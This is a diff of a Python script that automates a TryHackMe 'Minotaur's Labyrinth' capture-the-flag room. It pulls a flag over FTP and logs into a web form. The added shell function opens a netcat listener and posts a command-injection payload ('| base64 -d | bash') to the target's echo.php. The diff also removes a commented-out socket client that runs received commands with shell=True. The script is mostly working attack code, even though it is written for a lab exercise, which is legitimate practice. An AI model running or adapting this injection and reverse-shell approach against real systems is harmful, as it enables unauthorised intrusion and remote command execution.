@@ -2,21 +2,17 @@
 #made on mar 31 2023
 #TryHackMe's "Minotaur's Labyrinth"
 #made in python3
-#Testing phase
+#Project retired
 import requests as req
 import sys
-import socket
 import os
 from bs4 import BeautifulSoup
-from subprocess import run
 from ftplib import FTP
 
 tar_ip = sys.argv[1] #target IP
-#Host = sys.argv[2] #local IP (your ip)
-#Port = sys.argv[3] #port 
+Port = sys.argv[2] #port 
 sess = req.Session()
 
-#Needs 'Try' and 'except'
 def Mino_ftp_engine():
 
     with FTP(tar_ip) as conn:
@@ -25,10 +21,10 @@ def Mino_ftp_engine():
          conn.cwd('/pub/.secret')
 
          conn.retrbinary("RETR " + fn, open(fn, 'wb').write)
-          with open('flag.txt', 'r') as fp:
-               open_f = fp.read()
-               print("First flag: ", open_f)
-               fp.close()
+         with open('flag.txt', 'r') as fp:
+              open_f = fp.read()
+              print("First flag: ", open_f)
+              fp.close()
          conn.quit()
 
 Mino_ftp_engine()
@@ -45,25 +41,13 @@ def Mino_web_engine_login():
 
 Mino_web_engine_login()
 
-'''                               ---- Client is only needed i believe. 
-Mino_shell_C():        /
-    
-    with socket.socket(AF_INET, SOCK_STREAM) as s:
-         s.connect((tar_ip, Port))
-         s.listen(1)
-         conn, addr = s.accept()
-            
-         while True:
-             tk = s.recv(1024)
-             
-             if 'kill' in tk:
-                s.close()
-                break
-                
-             else:
-                SP = subprocess.Popen(tk, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                s.send(SP.stdout.read)
-                s.send(SP.stderr.read)
+def Mino_shell_C(): #fork it if you want, i'm deciding to do only web phases
+   
+    os.system(f'nc -lnvp {Port}')
+ 
+    payload = {'search': '{place here} | base64 -d | bash'} # if this doesn't work, manually place it in
+    url_C = f'http://{tar_ip}/echo.php'
+    PostData_C = sess.post(url_C, params=payload)
+
                 
 Mino_shell_C()
-'''
